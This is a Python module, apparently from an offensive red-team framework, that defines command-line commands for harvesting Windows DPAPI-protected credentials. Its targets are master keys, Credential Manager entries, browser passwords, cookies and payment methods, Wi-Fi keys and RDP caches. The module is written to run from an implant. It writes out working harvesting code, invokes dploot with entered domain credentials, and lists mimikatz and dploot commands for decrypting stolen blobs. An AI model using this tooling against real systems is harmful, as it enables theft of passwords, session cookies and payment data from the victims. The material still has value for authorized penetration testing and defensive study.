"""DPAPI credential harvesting command set.

Phase 09 — commands for DPAPI master key extraction, credential manager
decryption, browser data harvesting, and offline DPAPI blob attacks.
"""

from __future__ import annotations

import json
import os

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    exfiltration_category,
    print_error,
    print_msg,
    print_succ,
    print_warn,
)


class DPAPICommandSet(LazyOwnCommandSet):
    """DPAPI credential harvesting and decryption commands."""

    phase = "exfil"
    category = exfiltration_category

    @cmd2.with_category(exfiltration_category)
    def do_dpapi_harvest(self, line=""):
        """Harvest all DPAPI-protected credentials from the local machine.

        Usage: dpapi_harvest [--sessions <dir>]

        Collects:
        - Master keys from %APPDATA%/Microsoft/Protect
        - Credential Manager entries (cmdkey)
        - Chrome/Edge passwords, cookies, payment methods
        - Wi-Fi profiles with WPA keys
        - RDP credential cache
        - Windows Vault entries

        Run from the implant or local Windows machine.
        """
        del line
        try:
            from modules.dpapi_harvester import DPAPIHarvester
        except ImportError as exc:
            print_error(f"DPAPI module not available: {exc}")
            return

        sessions = self.params.get("sessions_dir", "sessions")
        harvester = DPAPIHarvester(sessions_dir=sessions)
        credentials = harvester.harvest_all()

        cred_file = harvester.export_credentials()
        mk_file = harvester.masterkey_report()

        print_msg(f"\nHarvested {len(credentials)} credentials")
        for cred in credentials:
            print_msg(f"  [{cred.source}] {cred.resource} — {cred.username}")
        print_succ(f"Credentials: {cred_file}")
        print_succ(f"Master keys: {mk_file}")

    @cmd2.with_category(exfiltration_category)
    def do_dpapi_masterkeys(self, line=""):
        """List and extract DPAPI master keys.

        Usage: dpapi_masterkeys [--path <masterkey_path>]

        Lists GUIDs, SIDs, and file paths for all discovered master keys.
        Use with dploot or dpapilab for offline decryption.
        """
        del line
        mk_path = os.path.expandvars(r"%APPDATA%\Microsoft\Protect")
        if not os.path.exists(mk_path):
            print_warn("Master key directory not found (not running on Windows target?)")
            print_msg("Default path: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Protect")
            print_msg("Upload the Protect directory to sessions/ and use dploot for offline decryption.")
            return

        sessions = self.params.get("sessions_dir", "sessions")
        os.makedirs(sessions, exist_ok=True)
        output = os.path.join(sessions, "masterkeys.txt")

        with open(output, "w") as f:
            f.write("=== DPAPI Master Keys ===\n\n")
            for root, dirs, files in os.walk(mk_path):
                for d in dirs:
                    f.write(f"SID Folder: {d}\n")
                for file in files:
                    fp = os.path.join(root, file)
                    f.write(f"  Key File: {fp}\n")
                    try:
                        with open(fp, "rb") as kf:
                            f.write(f"  Size: {os.path.getsize(fp)} bytes\n")
                    except Exception:
                        pass

        print_succ(f"Master key report written to {output}")
        print_msg(f"Key directory: {mk_path}")

        import shlex
        dploot_path = os.path.join(self.params.get("path", "."), "external", ".exploit", "dploot")
        if os.path.exists(dploot_path):
            domain = input("Domain (for dploot): ").strip() or self.params.get("domain", "")
            target = input("Target IP (for dploot): ").strip() or self.params.get("rhost", "")
            user = input("Username: ").strip()
            password = input("Password: ").strip()
            if all([domain, target, user, password]):
                self.cmd(f"dploot machinemasterkeys -d {domain} -u {user} -p '{password}' -t {target}")

    @cmd2.with_category(exfiltration_category)
    def do_dpapi_blob(self, line):
        """Decrypt a DPAPI blob offline.

        Usage: dpapi_blob <blob_hex> [--mk <masterkey_hex>] [--entropy <entropy_hex>]

        Decrypts a raw DPAPI blob using the provided master key.
        Format: hex string of the raw DPAPI ciphertext.
        """
        import shlex
        args = shlex.split(line)

        try:
            from modules.dpapi_harvester import DPAPIHarvester
        except ImportError:
            print_error("DPAPI module not available.")
            return

        if not args or args[0].startswith("--"):
            print_error("Usage: dpapi_blob <blob_hex> [--mk <masterkey_hex>] [--entropy <entropy_hex>]")
            print_msg("Obtain blob_hex from: mimikatz dpapi::blob /target:<hex>")
            return

        try:
            blob = bytes.fromhex(args[0])
        except ValueError:
            print_error("Invalid hex blob. Provide the raw DPAPI blob as hex.")
            return

        mk_hex = self._extract(args, "--mk")
        entropy_hex = self._extract(args, "--entropy")

        print_msg(f"Blob size: {len(blob)} bytes")
        if mk_hex:
            print_msg(f"Master key: {mk_hex[:32]}...")
        if entropy_hex:
            print_msg(f"Entropy: {entropy_hex[:32]}...")

        print_msg("\nDecryption requires Windows CryptUnprotectData or offline tool:")
        print_msg("  mimikatz: dpapi::blob /masterkey:<mk> /target:<blob_b64>")
        print_msg("  dpapilab: python3 dpapilab.py masterkey <mk> blob <blob>")
        print_msg("  dploot:   dploot blob -d <domain> -u <user> -pvk <key.pvk> -blob <blob_b64>")

    @staticmethod
    def _extract(args: list[str], flag: str) -> str | None:
        try:
            idx = args.index(flag)
            return args[idx + 1]
        except (ValueError, IndexError):
            return None


__all__ = ["DPAPICommandSet"]
